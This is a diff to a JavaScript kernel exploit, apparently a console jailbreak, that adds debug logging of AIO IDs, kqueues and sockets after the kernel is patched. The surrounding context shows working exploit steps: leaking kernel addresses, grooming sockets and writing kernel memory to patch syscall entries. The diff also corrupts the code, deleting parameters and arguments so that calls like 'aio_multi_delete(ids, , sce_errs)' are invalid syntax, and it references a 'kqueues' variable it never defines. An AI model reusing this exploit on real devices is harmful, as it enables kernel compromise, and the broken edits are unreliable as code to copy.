@@ -31,6 +31,13 @@ import { cstr, jstr } from './module/memtools.mjs';
 import { page_size, context_size } from './module/offset.mjs';
 import { Chain } from './module/chain.mjs';
 
+
+let debug_ids_p = null;
+let debug_num_ids = 0;
+let debug_kqueues = [];
+let debug_sds = [];
+
+
 import {
     View1, View2, View4,
     Word, Long, Pointer,
@@ -233,27 +240,27 @@ const _aio_errors_p = _aio_errors.addr;
 //     u_int num_ids,
 //     int sce_errors[]
 // );
-function aio_multi_delete(ids, num_ids, sce_errs=_aio_errors_p) {
-    sysi('aio_multi_delete', ids, num_ids, sce_errs);
+function aio_multi_delete(ids, , sce_errs=_aio_errors_p) {
+    sysi('aio_multi_delete', ids, , sce_errs);
 }
 
 // int
 // aio_multi_poll(
 //     SceKernelAioSubmitId ids[],
-//     u_int num_ids,
+//     u_int ,
 //     int states[]
 // );
-function aio_multi_poll(ids, num_ids, sce_errs=_aio_errors_p) {
-    sysi('aio_multi_poll', ids, num_ids, sce_errs);
+function aio_multi_poll(ids, , sce_errs=_aio_errors_p) {
+    sysi('aio_multi_poll', ids, , sce_errs);
 }
 
 // int
 // aio_multi_cancel(
 //     SceKernelAioSubmitId ids[],
-//     u_int num_ids,
+//     u_int ,
 //     int states[]
 // );
-function aio_multi_cancel(ids, num_ids, sce_errs=_aio_errors_p) {
+function aio_multi_cancel(ids, , sce_errs=_aio_errors_p) {
     sysi('aio_multi_cancel', ids, num_ids, sce_errs);
 }
 
@@ -881,7 +888,8 @@ function leak_kernel_addrs(sd_pair) {
     const leak_ids_len = num_handles * num_elems;
     const leak_ids = new View4(leak_ids_len);
     const leak_ids_p = leak_ids.addr;
-
+   debug_num_ids=leak_ids_len;
+    debug_ids_p=leak_ids_p ;
     log('find aio_entry');
     let reqs2_off = null;
     loop: for (let i = 0; i < num_leaks; i++) {
@@ -1633,11 +1641,54 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
     sessionStorage.setItem('jbsuccess', 1);
    // alert("kernel exploit succeeded!");
+    debug_status(debug_ids_p, debug_num_ids,  debug_sds);
+
 
 }
 
 
+function debug_status(ids_p, num_ids, sockets = []) {
+    try {
+        log("🔍 [DEBUG] Verifica AIO IDs:");
+        const len = max_aio_ids;
+        const rem = num_ids % len;
+        const num_batches = (num_ids - rem) / len;
+        for (let bi = 0; bi < num_batches; bi++) {
+            const addr = ids_p.add((bi << 2) * len);
+            for (let i = 0; i < len; i++) {
+                const id = addr.read32(i << 2);
+                if (id > 0) log(`  - ID ${id} (batch ${bi}, index ${i})`);
+            }
+        }
+        if (rem) {
+            const addr = ids_p.add((num_batches << 2) * len);
+            for (let i = 0; i < rem; i++) {
+                const id = addr.read32(i << 2);
+                if (id > 0) log(`  - ID ${id} (rem, index ${i})`);
+            }
+        }
+    } catch (e) {
+        log(`❌ Errore debug AIO: ${e}`);
+    }
 
+    try {
+        log("🔍 [DEBUG] Verifica Kqueues:");
+        for (let i = 0; i < kqueues.length; i++) {
+            log(`  - kqueue ID ${kqueues[i]}`);
+        }
+    } catch (e) {
+        log(`❌ Errore debug kqueues: ${e}`);
+    }
+
+    try {
+        log("🔍 [DEBUG] Verifica Socket:");
+        for (let i = 0; i < sockets.length; i++) {
+            log(`  - Socket SD ${sockets[i]}`);
+        }
+    } catch (e) {
+        log(`❌ Errore debug socket: ${e}`);
+    }
+}
 // FUNCTIONS FOR STAGE: SETUP
 
 function setup(block_fd) {
@@ -1764,7 +1815,7 @@ export async function kexploit() {
     for (let i = 0; i < num_sds; i++) {
         sds.push(new_socket());
     }
-
+   debug_sds =sds;
     let block_id = null;
     let groom_ids = null;
     try {
